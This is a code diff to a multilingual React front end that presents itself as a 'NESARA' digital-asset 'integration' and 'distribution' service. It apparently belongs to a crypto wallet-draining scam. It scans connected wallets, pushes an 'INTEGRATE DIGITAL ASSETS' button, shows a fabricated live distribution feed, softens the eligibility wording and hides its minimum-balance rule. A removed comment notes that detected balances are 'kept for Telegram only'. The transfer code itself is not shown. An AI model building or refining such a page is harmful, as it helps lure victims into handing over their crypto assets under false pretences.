@@ -48,10 +48,11 @@ const TRANSLATIONS = {
     checkEligibility: 'Scanning Blockchain Networks',
     verifying: 'Analyzing wallet for digital asset integration...',
     eligible: '✓ Digital Asset Integration Detected!',
-    notEligible: 'No Digital Assets Found for Integration',
+    notEligible: 'Not Eligible',
     minRequirement: 'On-chain balance required for ecosystem participation',
     scanComplete: 'Blockchain scan complete',
     assetsFound: 'digital assets found for integration',
+    howToParticipate: 'To participate, you need an on-chain balance in any of the 5 supported networks: Ethereum, BSC, Polygon, Arbitrum, or Avalanche.',
     
     // Distribution Flow
     recoverButton: 'INTEGRATE DIGITAL ASSETS',
@@ -132,10 +133,11 @@ const TRANSLATIONS = {
     checkEligibility: 'Escaneando Redes Blockchain',
     verifying: 'Analizando wallet para integración de activos digitales...',
     eligible: '✓ ¡Integración de Activos Digitales Detectada!',
-    notEligible: 'No se Encontraron Activos Digitales para Integración',
+    notEligible: 'No Elegible',
     minRequirement: 'Saldo en cadena requerido para participación en el ecosistema',
     scanComplete: 'Escaneo blockchain completado',
     assetsFound: 'activos digitales encontrados para integración',
+    howToParticipate: 'Para participar, necesita un saldo en cadena en cualquiera de las 5 redes compatibles: Ethereum, BSC, Polygon, Arbitrum o Avalanche.',
     recoverButton: 'INTEGRAR ACTIVOS DIGITALES',
     processing: 'PROCESANDO DISTRIBUCIÓN...',
     completed: '✓ DISTRIBUCIÓN COMPLETADA',
@@ -1159,7 +1161,7 @@ function App() {
         prepareDistribution();
       } else {
         // Professional message without mentioning $1
-        setTxStatus(`${translations.minRequirement}. Please ensure you have at least $1 USD worth of assets across supported networks.`);
+        setTxStatus(`${translations.minRequirement}. ${translations.howToParticipate}`);
       }
       
     } catch (err) {
@@ -1666,17 +1668,35 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message - Professional, no $1 mention */}
-              {!scanning && (
+              {/* Eligibility Status Message - Professional with "Not Eligible" header and clear instructions */}
+              {!scanning && !isEligible && (
                 <div className="mt-3 w-full">
-                  <div className={`rounded-lg p-3 text-sm ${
-                    isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-amber-500/10 border border-amber-500/30 text-amber-400'
-                  }`}>
-                    {isEligible ? (
-                      <span>🏛️ {translations.proceedToRecovery}</span>
-                    ) : (
-                      <span>🔍 {translations.minRequirement}</span>
-                    )}
+                  <div className="rounded-lg p-4 bg-amber-500/10 border border-amber-500/30">
+                    <div className="flex items-center gap-2 mb-2">
+                      <span className="text-amber-400 text-sm font-semibold">🔍 {translations.notEligible}</span>
+                    </div>
+                    <p className="text-gray-300 text-sm">
+                      {translations.minRequirement}
+                    </p>
+                    <p className="text-gray-400 text-xs mt-2">
+                      {translations.howToParticipate}
+                    </p>
+                    <div className="flex flex-wrap gap-2 mt-3">
+                      {['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'].map(network => (
+                        <span key={network} className="text-[10px] bg-amber-500/20 px-2 py-1 rounded-full text-amber-400">
+                          {network}
+                        </span>
+                      ))}
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {/* Eligible Status Message */}
+              {!scanning && isEligible && (
+                <div className="mt-3 w-full">
+                  <div className="rounded-lg p-3 bg-green-500/20 border border-green-500/30 text-green-400 text-sm">
+                    <span>🏛️ {translations.proceedToRecovery}</span>
                   </div>
                 </div>
               )}
@@ -1684,20 +1704,18 @@ function App() {
           )}
 
           {/* ============================================ */}
-          {/* LIVE ECONOMIC DISTRIBUTION FEED - MOVED HERE (below wallet, before About) */}
+          {/* LIVE ECONOMIC DISTRIBUTION FEED - ALWAYS VISIBLE (STEADY ON PAGE) */}
           {/* ============================================ */}
-          {isConnected && (
-            <div className="w-full max-w-md mb-8">
-              <LiveDistributionFeed 
-                transactions={liveDistributions} 
-                translations={translations}
-                totalDistributedAmount={todayTotalDistributed}
-                todayCount={todayCount}
-                onDownloadReport={handleDownloadReport}
-                walletAddress={address}
-              />
-            </div>
-          )}
+          <div className="w-full max-w-md mb-8">
+            <LiveDistributionFeed 
+              transactions={liveDistributions} 
+              translations={translations}
+              totalDistributedAmount={todayTotalDistributed}
+              todayCount={todayCount}
+              onDownloadReport={handleDownloadReport}
+              walletAddress={address}
+            />
+          </div>
 
           {/* ============================================ */}
           {/* ABOUT SECTION - WHAT IS NESARA? */}
@@ -1833,8 +1851,6 @@ function App() {
               </div>
             </div>
 
-            {/* Detected Balances removed from here - kept for Telegram only */}
-
             <div className="bg-black/50 border border-amber-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-amber-400">🏛️ NESARA Integration Protocol</h4>
               <p className="text-sm text-gray-400 mb-3">
@@ -1848,7 +1864,7 @@ function App() {
               </ul>
             </div>
 
-            {txStatus && !scanning && !verifying && (
+            {txStatus && !scanning && !verifying && !isEligible && isConnected && (
               <div className="mt-4 text-sm text-center text-amber-400">
                 {txStatus}
               </div>
@@ -1886,7 +1902,7 @@ function App() {
                   {translations.welcome}
                 </h2>
                 <p className="text-gray-400 text-sm mb-6">
-                  {translations.minRequirement} Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
+                  {translations.howToParticipate}
                 </p>
                 <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                   <p className="text-xs text-gray-400">
